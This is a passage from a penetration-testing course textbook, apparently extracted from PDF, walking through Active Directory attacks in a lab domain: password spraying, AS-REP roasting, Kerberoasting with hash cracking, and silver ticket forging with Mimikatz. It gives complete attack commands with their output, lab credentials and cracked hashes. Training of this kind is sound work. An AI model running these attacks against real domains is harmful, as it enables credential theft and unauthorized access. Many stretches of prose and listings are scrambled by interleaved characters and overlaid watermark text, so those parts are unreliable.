+(name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+
+SMB  192.168.50.75 445 CLIENT75                                           [+] corp.com\dave:Flowers1
+
+(<cr>Pwn3d!</cr>)
+
+     Listing 855 - Crackmapexec output indicating that the valid credentials have administrative privileges on the target
+
+Listing 855 shows that crackmapexec added Pwn3d! to the output, indicating that dave has
+administrative privileges on the target system. In an assessment, this is an excellent feature to
+determine the level of access we have without performing additional enumeration.
+
+The third kind of password spraying attack we'll discuss is based on obtaining a TGT. For
+example, using kinit on a Linux system, we can obtain and cache a Kerberos TGT. We'll need to
+provide a username and password to do this. If the credentials are valid, we'll obtain a TGT. The
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                   804
+                                                                                     Penetration Testing with Kali Linux
+
+advantage of this technique is that it only uses two UDP frames to determine whether the
+password is valid, as it sends only an AS-REQ and examines the response.
+
+We could use Bash scripting or a programming language of our choice to automate this method.
+Fortunately, we can also use the tool kerbrute, implementing this technique to spray passwords.
+Since this tool is cross-platform, we can use it on Windows and Linux.
+
+Let's use the Windows version in C:\Tools to perform this attack. To conduct password spraying,
+we need to specify the passwordspray command along with a list of usernames and the
+password to spray. We'll also need to enter the domain corp.com as an argument for -d. As
+previously, we'll create a file named usernames.txt in C:\Tools containing the usernames pete,
+dave, and jen.
+
+PS C:\Tools> <cu>type .\usernames.txt</cu>
+pete
+dave
+jen
+
+PS C:\Tools> <cu>.\kerbrute_windows_amd64.exe passwordspray -d corp.com
+.\usernames.txt "Nexus123!"</cu>
+
+__                  __          __
+
+/ /_____ _____/ /_ _______ __/ /____
+
+/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+
+/ ,< / __/ / / /_/ / / / /_/ / /_/ __/
+
+/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop
+
+2022/09/06 20:30:48 >    <D<UcsdcorcnriLin>1e>s![.g[tic++ngT]]oKreD8CpVVs5tAA.(6cLLse- dI)IoU:DmDs3:inLL8g8lOOJkoGGeegIIrfbNNifr:n:ursteeytj(poe2eWatnhtise@tat@cuclccokorocuwpresps.e.scr eocacsmoc:m)oN:ueNinenxtsxus0us1.1024231!3<!s<//eccrc>ro>nds
+2022/09/06 20:30:48 >
+2022/09/06 20:30:48 >
+2022/09/06 20:30:48 >
+2022/09/06 20:30:48 >
+
+Very nice! Listing  856  shows  tOhSa-t57k7e5r2b1r9u0te  confirmed        that  the  password  Nexus123!                                                                                                                                                 is  valid  for
+pete and jen.
+
+If you receive a network error, make sure that the encoding of usernames.txt is ANSI.
+
+You can use Notepad's Save As functionality to change the encoding.
+
+For crackmapexec and kerbrute, we had to provide a list of usernames. To obtain a list of all
+domain users, we can leverage techniques we learned in the Module Active Directory Introduction
+and Enumeration or use the built-in user enumeration functions of both tools.
+
+In this section, we explored ways to perform password attacks in the context of AD. We
+discussed and practiced three different methods for password spraying attacks. These
+techniques are a great way to obtain valid credentials in the context of AD, especially if there is no
+lockout threshold set in the account policy. In the next two sections, we'll perform attacks that
+leverage hash cracking and often provide a higher success rate than password spraying.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                            805
+                                                                                       Penetration Testing with Kali Linux
+
+23.2.2 AS-REP roasting
+
+As we have discussed, the first step of the authentication process via Kerberos is to send an AS-
+REQ. Based on this request, the domain controller can validate if the authentication is successful.
+If it is, the domain controller replies with an AS-REP containing the session key and TGT. This
+step is also commonly referred to as Kerberos Pre-Authentication and prevents offline password
+guessing.
+
+Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain
+controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the
+attacker could perform an offline password attack against the encrypted part of the response.
+This attack is known as AS-REP Roasting.
+
+By default, the AD user account option Do not require Kerberos preauthentication is disabled,
+meaning that Kerberos preauthentication is performed for all users. However, it is possible to
+enable this account option manually. In assessments, we may find accounts with this option
+enabled as some applications and technologies require it to function properly.
+
+Let's perform this attack from our Kali machine first, then on Windows. On Kali, we can use
+impacket-GetNPUsers to perform AS-REP roasting. We'll need to enter the IP address of the
+domain controller as an argument for -dc-ip, the name of the output file in which the AS-REP hash
+will be stored in Hashcat format for -outputfile, and -request to request the TGT.
+
+Finally, we need to specify the target authentication information in the format domain/user. This
+
+is the user we use for authentication. For this example, we'll use pete with the password
+
+Nexus123! from the previous section. The  -cdocm-ipplet1e92Wc.hoi1mt6l8mo.wa50n.d7i0s  shown below:
+
+kali@kali:~$ <cu>impacket-GetNPUsers                                                     -request -outputfile
+hashes.asreproast corp.com/pete</cu>
+
+Impacket v0.10.0 - Copyright 2022  SecurJeeAfuftrheLyCaosrtpLoorgaotnion               UAC
+
+Password:
+Name MemberOf PasswordLastSet
+               -------L-is-ti-2n-0g-2O8-2S5---7-05--97U7--s5-0in2-g1-9G-10e-9t-:N-2P-1U-:s1e7rs.-t2-o8-p5-e4-rf6-o4-rm--A2-S0--2-R2-E--P-0r-9o--as-0t-7in-g-1-2-:-4-5-:15.-5-5-9-2-9-9--
+---- --------
+<cr>dave</cr>
+0x410200
+
+Listing 857 shows that dave has the user account option Do not require Kerberos
+
+preauthentication enabled, meaning it's vulnerable to AS-REP Roasting.
+
+By default, the resulting hash format of impacket-GetNPUsers is compatible with Hashcat.
+Therefore, let's check the correct mode for the AS-REP hash by grepping for "Kerberos" in the
+Hashcat help.
+
+kali@kali:~$ <cu>hashcat --help | grep -i "Kerberos"</cu>                              | Network Protocol
+   19600 | Kerberos 5, etype 17, TGS-REP                                               | Network Protocol
+   19800 | Kerberos 5, etype 17, Pre-Auth                                              | Network Protocol
+   19700 | Kerberos 5, etype 18, TGS-REP                                               | Network Protocol
+   19900 | Kerberos 5, etype 18, Pre-Auth                                              | Network Protocol
+     7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                                      | Network Protocol
+   13100 | Kerberos 5, etype 23, TGS-REP
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                  806
+                                                                                                                          Penetration Testing with Kali Linux
+
+   <cr>18200 | Kerberos 5, etype 23, AS-REP                                                                               | Network
+Protocol</cr>
+
+                                             Listing 858 - Obtaining the correct mode for Hashcat
+
+The output of the grep command in listing 858 shows that the correct mode for AS-REP is 18200.
+
+We've now collected everything we need to launch Hashcat and crack the AS-REP hash. Let's
+enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as
+rule file, and --force to perform the cracking on our Kali VM.
+
+kali@kali:~$ <cu>sudo hashcat -m 18200 hashes.asreproast
+/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</cu>
+...
+
+$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b
+739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750c
+f33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362
+fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd865
+8b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3
+092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc2
+2:<cr>Flowers1</cr>
+...
+
+                                            Listing 859 - Cracking the AS-REP hash with Hashcat
+
+Very nice! Hashcat successfully cracked the AS-REP hash. Listing 859 shows that the user dave
+has the password Flowers1.
+
+sIefhxyeuortcudisroeewcsenoivyfeothuthirseKMaHloai dVsuhMlceaa. tnedrraodrd"NmootreenRoAuMghtaolliotW.ch4iaGttalBobwilse  device memory for this attack",
+                                                                                                                          enough for the examples and
+
+tAosomlseetntfioornerda,wweKecrabneraolssoinpteerrfaocrmtionAsS-aRnEdPJeRfafboruaessyetisn.g  on  Windows. We'll use Rubeus, which is a
+                                                                                              To  perform this attack, we'll connect to
+
+SaCcaniLnnyIcEoseNttahwTre7etr5'aroevPpiptoaieowrRnfeDosrrSPtmohaeiRnsllguwdbtoeihnmuidssoaaeiwntxtOacauScen-skpd5et7ran7asja5es2vafr1ifeg9ppwa0rrteoiet-haatsouttht.CheRe:\unpTbtaoiecsouaslsswte,wodwrilhddl eoaHrmueetoanRimcunhbaumetsiuacesnar.,PlelwyuxetierdicdedaBnontonifnb'tybehvofaunovl1une1ne.tdroaN.bpelerxotu,vsiwdeeer
+
+accounts. We also add the flag /nowrap to prevent new lines being added to the resulting AS-REP
+
+hashes.
+
+PS C:\Users\jeff> <cu>cd C:\Tools</cu>
+
+PS C:\Tools> <cu>.\Rubeus.exe asreproast /nowrap</cu>
+
+______    _
+
+(_____ \  ||
+
+_____) )_ _| |__ _____ _ _ ___
+
+| __ /| | | | _ \| ___ | | | |/___)
+
+| | \ \| |_| | |_) ) ____| |_| |___ |
+
+|_| |_|____/|____/|_____)____/(___/
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                   807
+                                                                          Penetration Testing with Kali Linux
+
+v2.1.2
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain            : corp.com
+
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for
+
+'(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+
+[*] SamAccountName           : dave
+
+[*] DistinguishedName        : CN=dave,CN=Users,DC=corp,DC=com
+
+[*] Using domain controller: DC1.corp.com (192.168.50.70)
+
+[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
+
+[+] AS-REQ w/o preauth successful!
+
+[*] AS-REP hash:
+
+$krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954
+E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B1
+19FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC07433
+33959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C24
+2ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162
+BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
+
+                                       Listing 860 - Using Rubeus to obtain the AS-REP hash of dave
+
+Listing 860 shows that Rubeus identified dave as vulnerable to AS-REP Roasting and displays the
+AS-REP hash.
+
+Next, let's copy the AS-REP hash and paste it into a text file named hashes.asreproast2 in the
+ehk/.$uk6.aols.rdmbirc5/@9esakadahs0ilardrer1eic6pe:t/$~co$dwbroa5yr<vboedceu8l@f i>ecus9sosdutrepsdcro.a/kccraohcolacmai.k8:sWa8yhceoce3a4uc3.cta1tc3xa-nt9cmn04o10-1w31r81c2sca0/7b0utaedsJr77rhte1b/afHd9ssfaehhar71aesef6srhy7f.ece4/aWa77hshti62raat7eseglb9phao9drcwid7oan72tat5f/so02tr6eu2c$blra47ed9sc48/k9cbte5eh99se4atA1b60a4Sd2.-8erR92uE99lP8ce04h4e-ad2-sfefh36o.65r07c59e32<fb/37c39ub5>14
+32.b1cra39.aa9f>b.a5dFaeble999o14wa78c83ae07833rsced441918<80493/0eddc8b22r36b>1e85447876a81b8ab32bcd716da9cc173a9bfeb40d20b6ddb3bbO95f6See8d-423458af27751825c2dd22414141fe9ab47028abc0d772694185343d06e1cd8d72b56314698411393d7b9a2d287a44d5f0d4dfcc23c63046d4146f24daa090e2564805a1e9d3720a5c05b050cb2371e598291d68ffd1f8b307fa8d04eebac1cd7f87d5e54ff7afd5ca4a280177281ac426:3324<
+
+                                               Listing 861 - Cracking the modified AS-REP hash
+
+Nice! Hashcat successfully cracked the AS-REP hash.
+
+To identify users with the enabled AD user account option Do not require Kerberos
+preauthentication, we can use PowerView's Get-DomainUser function with the option -
+PreauthNotRequired on Windows. On Kali, we can use impacket-GetNPUsers as shown in listing
+857 without the -request and -outputfile options.
+
+Let's assume that we are conducting an assessment in which we cannot identify any AD users
+with the account option Do not require Kerberos preauthentication enabled. While enumerating, we
+notice that we have GenericWrite or GenericAll permissions on another AD user account. Using
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.             808
+                                                                          Penetration Testing with Kali Linux
+
+these permissions, we could reset their passwords, but this would lock out the user from
+accessing the account. We could also leverage these permissions to modify the User Account
+Control value of the user to not require Kerberos preauthentication. This attack is known as
+Targeted AS-REP Roasting. Notably, we should reset the User Account Control value of the user
+once we've obtained the hash.
+
+In this section, we first explored the theory behind AS-REP Roasting. We then performed this
+attack on Kali with impacket-GetNPUsers and on Windows with Rubeus. In the next section, we'll
+perform a similar attack, but instead of abusing a missing Kerberos preauthentication, we'll target
+SPNs.
+
+23.2.3 Kerberoasting
+
+Let's recall how the Kerberos protocol works. We know that when a user wants to access a
+resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is
+generated by the domain controller. The service ticket is then decrypted and validated by the
+application server, since it is encrypted via the password hash of the SPN.
+
+When requesting the service ticket from the domain controller, no checks are performed to
+confirm whether the user has any permissions to access the service hosted by the SPN.
+
+These checks are performed as a second step only when connecting to the service itself. This
+means that if we know the SPN we want to target, we can request a service ticket for it from the
+domain controller.
+
+Tpdaehcsersyswpeotrvriditcoeufsttiichnkegestbeirsruvteicenecfaorycrpccteoeudonrut.sgTiunhegisstshteinecghS, nPwiNqeu'secpiasanskWsnuhwosiwoetlrndothwahissaKsinhef.robIfremrwoaeatsicotainnngt.roeqcureasctk ththeeticckleeatrtaenxdt
+
+In this section, we will abuse a service  titcokJeeCtfLafrInEedNyaTt7te5mvpitatoRcDrPackasthejepfaf sswwitohrdthoef  the service
+account. Let's begin by connecting                                                                                    password
+HenchmanPutridBonbon11.
+sTtuhtsooiesrpre,aettrthtfhaoeecrtmkoreotKesl ecuwrhltiblnilneiiqgrdoueaTensG.ttiIfSinny-gRaa,EdlwlPdSeiPt'hilOolNaSunss-s,h5lewi7ni7Renk5'ue.l2ldb1Spe9iwrnu0oicstvehiadagweadehion'lalm.sWehaxeeienscs.uukpseteeercbri.Rfeyruotbhaeesutksaeasrbsaenaronaarsagtuuctmhoemennmtticafaontred/dtooudltoafmiulenactinho
+
+PS C:\Tools> <cu>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</cu>
+
+______    _
+
+(_____ \  ||
+
+_____) )_ _| |__ _____ _ _ ___
+
+| __ /| | | | _ \| ___ | | | |/___)
+
+| | \ \| |_| | |_) ) ____| |_| |___ |
+
+|_| |_|____/|____/|_____)____/(___/
+
+v2.1.2
+
+[*] Action: Kerberoasting
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                             809
+                                                                                                                                                                                               Penetration Testing with Kali Linux
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+
+[*]  Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain      : corp.com
+
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for
+
+'(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAc
+
+countControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] <cr>Total kerberoastable users : 1</cr>
+
+[*] SamAccountName     : <cr>iis_service</cr>
+
+[*] DistinguishedName  : CN=iis_service,CN=Users,DC=corp,DC=com
+
+[*] ServicePrincipalName : HTTP/web04.corp.com:80
+
+[*] PwdLastSet         : 9/7/2022 5:38:43 AM
+
+[*] Supported ETypes   : RC4_HMAC_DEFAULT
+
+[*] <cg>Hash written to C:\Tools\hashes.kerberoast</cg>
+
+                       Listing 862 - Utilizing Rubeus to perform a Kerberoast attack
+
+Listing 862 shows that Rubeus identified one user account vulnerable to Kerberoasting and wrote
+the hash to an output file.
+
+Now, let's copy hashes.kerberoast to our Kali machine. We can then review the Hashcat help for
+the correct mode to crack a TGS-REP hash.
+
+kali@kali:~$ <cu>cat hashes.kerberoast</cu>
+
+$<cr>krb5tgs$23$</cr>*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5
+
+DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DE
+.A9A.3.B94A8AE7DE37ABD0EBC746607ED52C2DB40F46187041D64..2.63557BC0E4025BFB92D8W9hiBtAl5oCw12C26C72232905DEC4D060D3C898894541
+
+kali@kali:~$ <cu>hashcat --help   TP|rGeSg--rRAeEupPtJh-eiff"rKeeyrberos"</cu>                                                                                                                 | Network Protocol
+   19600 | Kerberos 5, etype 17,                                                                                                                                                               | Network Protocol
+   19800 | Kerberos 5, etype 17,
+
+Pr11<1o8c979t975r2o>0000c10000o3l|||1|<0/K0KKKceeeerrr|rr>bbbbeKeeererrrooroosssbse5555r,,o,,seeeettt5t,yyyyppppeeeeetOy2121S8p383-,,,e,577AAT2P5SrSG32e,S--1R--R9TAEER0GuEQPStPhP-rReEP-Auth  | Network Protocol
+                                                                                                                                                                                               | Network Protocol
+                                                                                                                                                                                               | Network Protocol
+
+                                                                                                                                                                                                      | Network
+
+                                                                                                                                                                                               | Network Protocol
+
+                       Listing 863 - Reviewing the correct Hashcat mode
+
+The output of the second command in Listing 863 shows that 13100 is the correct mode to crack
+TGS-REP hashes.
+
+As in the previous section, we'll start Hashcat with the arguments 13100 as mode, rockyou.txt as
+wordlist, best64.rule as rule file, and --force as we perform the cracking in a VM.
+
+kali@kali:~$ <cu>sudo hashcat -m 13100 hashes.kerberoast
+/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</cu>
+...
+
+$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                           810
+                                                                          Penetration Testing with Kali Linux
+
+a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b
+0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7a
+dec407d22bf6871d
+...
+d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce6369
+4e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:<cr>Strawberry1</cr>
+...
+
+                                                    Listing 864 - Cracking the TGS-REP hash
+
+Great! We successfully retrieved the plaintext password of the user iis_service by performing
+Kerberoasting.
+
+Next, let's perform Kerberoasting from Linux. We can use impacket-GetUserSPNs with the IP of
+the domain controller as the argument for -dc-ip. Since our Kali machine is not joined to the
+domain, we also must provide domain user credentials to obtain the TGS-REP hash. As before,
+we can use -request to obtain the TGS and output them in a compatible format for Hashcat.
+
+kali@kali:~$ <cu>sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70
+corp.com/pete</cu>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:               Name         MemberOf                             PasswordLastSet             LastLogon
+ServicePrincipalName    -----------  --------                             --------------------------  ---------
+Delegation              iis_service                                       2022-09-07 08:38:43.411468  <never>
+----------------------
+----------
+HTTP/web04.corp.com:80
+
+[<e-c4]dr>eC6$Ck0ar$cbahc5e1t4gfs5i$9l52e38$8i*asi99indso3_t6seffrbov3u1inccdee.e$7CSOakeRifPpb.pC0i3OncMdg$7c..4o.0rep.9ccco6m/dW9ihi8its1l6_os8we06rvcci1ceea*4$421bb1442737f847adf7bbe55fc1a7723ab71fe99af6ad73b99c
+66c02adcbf66b442c39ed45e12472441L1fie7stedin0cg.ec.86.25<7/a- Uc8r7sic>n4gcim8bpbac4kee5t-bG1ebtJUbes4fe5fr5Sr7Pe1Ny4sdt3odpde5rf2ocrm16Kae4rbee4rco2as4t2indgfo9n4L8i9n7ux994ec0087cf5cfb1
+ListinIwfgeim8n6pe5aecsdkhteootw-sGsyentthcUhastreowrnSeizPseNutschcteOheStrs-iom5sw7feu7s5loly2tfh1ote9hb0eetraKrionareli"dKmtRhaBec_hTAiGnPeS_E-wRRiEtRhP_tShhKaesEdhWo. m(Caloinckcosnketrwollteoro. Wgreeacta)n,"
+
+     use ntpdate or rdate to do so.
+
+Now, let's store the TGS-REP hash in a file named hashes.kerberoast2 and crack it with Hashcat
+as we did before.
+
+kali@kali:~$ <cu>sudo hashcat -m 13100 hashes.kerberoast2
+/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</cu>
+...
+
+$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de
+60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960ad
+f6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2c
+b64439d514241eec
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                         811
+                                                                                        Penetration Testing with Kali Linux
+
+...
+a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e334a2856c009bc76e4e2437
+2c4db4d7f41a8be56e1b6a912c44dd259052299bac30de6a8d64f179caaa2b7ee87d5612cd5a4bb9f050ba
+565aa97941ccfd634b:<cr>Strawberry1</cr>
+...
+
+                                                    Listing 866 - Cracking the TGS-REP hash
+
+Listing 866 shows that we could successfully crack the TGS-REP hash again, providing the same
+plaintext password as before.
+
+This technique is immensely powerful if the domain contains high-privilege service accounts with
+weak passwords, which is not uncommon in many organizations. However, if the SPN runs in the
+context of a computer account, a managed service account, or a group-managed service account,
+the password will be randomly generated, complex, and 120 characters long, making cracking
+infeasible. The same is true for the krbtgt user account which acts as service account for the
+KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs running
+in the context of user accounts is much higher.
+
+Let's assume that we are performing an assessment and notice that we have GenericWrite or
+GenericAll permissions on another AD user account. As stated before, we could reset the user's
+password but this may raise suspicion. However, we could also set an SPN for the user,
+kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.
+We'll note that in an assessment, we should delete the SPN once we've obtained the hash to
+avoid adding any potential vulnerabilities to the client's infrastructure.
+
+We've now covered how an SPN can be abused to obtain a TGS-REP hash and how to crack it. In
+
+the next  section, we'll explore an  attack  utilizing  a  forWgheidtlToGw S.
+
+23.2.4          Silver tickets
+
+In the previous  SsPeNc.tiIonnt,hwiseseocbtitoanin, ewde'lal ngdoJeocfnrfaerceskyteedp  a TGS-REP hash to       retrieve the plaintext
+password of an                                                                          further and forge our  own service tickets.
+
+esmRexeeermvmciuecbmeteinrbgtseihcriiknipnesgtthiteanhrceceluoidnnnentoedetxrtivnwoeorftihrftkieheinedOsgSes-sbr5evy7roiv7cfit5echt2ehe1te9iac0ackKpeceptor.lbuicHenartootwicsohenaevuceinktrh,setmhtnhetoeicsuatustsieeoernnr'v,asintrhopdeenrmgmarpeoinspustlpiscio.apnteIsinormnfrtohiosminssiottchnhaesesseigne,rorttvuhhepeer
+application blindly trusts the integrity of the service ticket since it is encrypted with a password
+
+hash that is, in theory, only known to the service account and the domain controller.
+
+Privileged Account Certificate (PAC) validation is an optional verification process between the SPN
+application and the domain controller. If this is enabled, the user authenticating to the service and
+its privileges are validated by the domain controller. Fortunately for this attack technique, service
+applications rarely perform PAC validation.
+
+As an example, if we authenticate against an IIS server that is executing in the context of the
+service account iis_service, the IIS application will determine which permissions we have on the
+IIS server depending on the group memberships present in the service ticket.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                       812
+                                                                          Penetration Testing with Kali Linux
+
+With the service account password or its associated NTLM hash at hand, we can forge our own
+service ticket to access the target resource (in our example, the IIS application) with any
+permissions we desire. This custom-created ticket is known as a silver ticket and if the service
+principal name is used on multiple servers, the silver ticket can be leveraged against them all.
+
+In this section's example, we'll create a silver ticket to get access to an HTTP SPN resource. As
+we identified in the previous section, the iis_service user account is mapped to an HTTP SPN.
+Therefore, the password hash of the user account is used to create service tickets for it. For the
+purposes of this example, let's assume we've identified that the iis_service user has an
+established session on CLIENT75.
+
+In general, we need to collect the following three pieces of information to create a silver ticket:
+
+� SPN password hash
+
+� Domain SID
+
+� Target SPN
+
+Let's get straight into the attack by connecting to CLIENT75 via RDP as jeff with the password
+HenchmanPutridBonbon11.
+
+First, let's confirm that our current user has no access to the resource of the HTTP SPN mapped
+to iis_service. To do so, we'll use iwr and enter -UseDefaultCredentials so that the credentials of
+the current user are used to send the web request.
+
+PS C:\Users\jeff> <cu>iwr -UseDefaultCredentials http://web04</cu>
+iwr :
+
+Sy<oce4Yruro0v>u14esru0-dp1oEp-UrlnnirUaooenutdrat.uhhtoahrvoierziepzdee:rdm:AicsAcsceicsoesnssitsoisdveidneeiwneidtehJddieusfdefudretieoryteoicWnthiivotnarlvlyoaiwldoirdcrpceardgeeednetunistaiilnasgl.st.h<e/ccrr>edentials that
++A+(tSy~iewl~s+pirt~te~n-Cie~mUao~:.stn~1Neee~Bgt~cao~.hsr~aHiy~trcIt~:Pn1~paf~Wro~es~biR~ne~g~qu~~e-s~Ut~s:~e~HDO:~teSt~f-I~pa5nW~u77v~el5a~bt2lR~C1~ier9qd~e0uO~de~pee~sntr~t)a~i~ta~i[lIo~sn~nv~:ho~t~kt~ep~:-~/W~/e~wb~eR~be~0q~4uest], WebExc
+
+       + FullyQualifiedErrorId :
+WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+                                    Listing 867 - Trying to access the web page on WEB04 as user jeff
+
+Listing 867 shows that we cannot access the web page as jeff. Let's start collecting the
+information needed to forge a silver ticket.
+
+Since we are a local Administrator on this machine where iis_service has an established session,
+we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service), which is the
+first piece of information we need to create a silver ticket.
+
+Let's start PowerShell as Administrator and launch Mimikatz. As we already learned, we can use
+privilege::debug and sekurlsa::logonpasswords to extract cached AD credentials.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  813
+                                                                          Penetration Testing with Kali Linux
+
+mimikatz # <cu>privilege::debug</cu>
+Privilege '20' OK
+
+mimikatz # <cu>sekurlsa::logonpasswords</cu>
+
+Authentication Id : 0 ; 1147751 (00000000:00118367)
+
+Session          : Service from 0
+
+User Name        : iis_service
+
+Domain           : CORP
+
+Logon Server     : DC1
+
+Logon Time       : 9/14/2022 4:52:14 AM
+
+SID              : S-1-5-21-1987370270-658905905-1781884369-1109
+
+         msv :
+
+         [00000003] Primary
+
+         * Username : iis_service
+
+         * Domain : CORP
+
+         * NTLM  : <cr>4d28cf5252d39971419580a51484ca09</cr>
+
+         * SHA1  : ad321732afe417ebbd24d5c098f986c07872f312
+
+         * DPAPI : 1210259a27882fac52cf7c679ecf4443
+
+...
+
+Listing 868 - Using Mimikatz to obtain the NTLM hash of the user account iis_service which is mapped to the target SPN
+
+Listing 868 shows the password hashes of the iis_service user account. The NTLM hash of the
+service account is the first piece of information we need to create the silver ticket.
+
+Now, let's obtain the domain SID, the second piece of information we need. We can enter whoami
+/user to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN
+user account from the output of Mimikatz, since the domain user accounts exist in the same
+dPwASosem'rCce:oa\iovnUen.srleyedrinsit\nejretehfseft>eWd<iincndut>ohwwehsoDaPomrmiivai/lienugsSeeIrDE<s,/cwcauel>a'lJlteioofmnfriMet ytohdWehuRiletID,lotohwfetSheIDucsoern.sists of several parts. Since
+U=c-USso-==-reErp-=R\=-j=IN-eN=-afF-=mf=Oe-R-<S=-Mc=I-Ar=D-T>-=IS=O---N=1=-=5=-=2=1==-=1=9=8=7=3O=7S=0-=25=777=05=-2=61=59=80=9=0=5=9=0=5=-=1=7=8=1=8=8=4=3=6=9=</cr>-1105
+
+                                                      Listing 869 - Obtaining the domain SID
+
+The highlighted section in listing 869 shows the domain SID.
+
+The last list item is the target SPN. For this example, we'll target the HTTP SPN resource on
+WEB04 (HTTP/web04.corp.com:80) because we want to access the web page running on IIS.
+
+Now that we have collected all three pieces of information, we can build the command to create a
+silver ticket with Mimikatz. We can create the forged service ticket with the kerberos::golden
+module. This module provides the capabilities for creating golden and silver tickets alike. We'll
+explore the concept of golden tickets in the Module Lateral Movement in Active Directory.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  814
+                                                                          Penetration Testing with Kali Linux
+
+We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the
+SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN
+(/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the
+machine we execute the command on.
+
+Finally, we must enter an existing domain user for /user:. This user will be set in the forged ticket.
+For this example, we'll use jeffadmin. However, we could also use any other domain user since we
+can set the permissions and groups ourselves.
+
+The complete command can be found in the following listing:
+
+mimikatz # <cu>kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369
+
+/domain:corp.com /ptt /target:web04.corp.com /service:http
+
+/rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin</cu>
+
+User  : <cr>jeffadmin</cr>
+
+Domain : corp.com (CORP)
+
+SID   : S-1-5-21-1987370270-658905905-1781884369
+
+User Id : 500
+
+Groups Id : <cr>*513 512 520 518 519</cr>
+
+ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
+
+Service : <cr>http</cr>
+
+Target : <cr>web04.corp.com</cr>
+
+Lifetime : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
+
